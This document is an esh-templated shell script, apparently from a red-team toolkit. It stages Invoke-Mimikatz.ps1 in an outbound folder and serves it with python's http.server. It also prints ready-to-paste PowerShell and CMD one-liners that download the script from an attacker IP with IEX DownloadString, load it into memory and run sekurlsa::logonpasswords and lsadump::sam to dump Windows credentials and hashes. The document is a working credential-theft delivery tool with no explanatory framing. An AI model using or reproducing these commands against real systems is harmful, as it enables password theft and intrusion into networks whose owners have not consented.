mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/mimikatz/Invoke-Mimikatz.ps1 packstation/outbound/; \
echo '================================================================'; \
echo '                      -----PowerShell-----                      '; \
echo 'Preparation: Open Powershell with administrative privileges'; \
echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-Mimikatz.ps1\')'; \
echo 'Usage: Invoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"\''; \
echo '================================================================'; \
echo '                         -----CMD-----                          '; \
echo 'Deliver & Inject to memory & Execute (PS 64-bit): %windir%\Sysnative\WindowsPowerShell\v1.0\powershell.exe -Command "& {IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -Command \'\\"privilege::debug\\" \\"token::elevate\\" \\"sekurlsa::logonpasswords\\" \\"exit\\"\'}"'; \
echo 'Deliver & Inject to memory & Execute (PS 32-bit): powershell -Command "& {IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -Command \'\\"privilege::debug\\" \\"token::elevate\\" \\"sekurlsa::logonpasswords\\" \\"exit\\"\'}"'; \
echo '================================================================'; \
python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
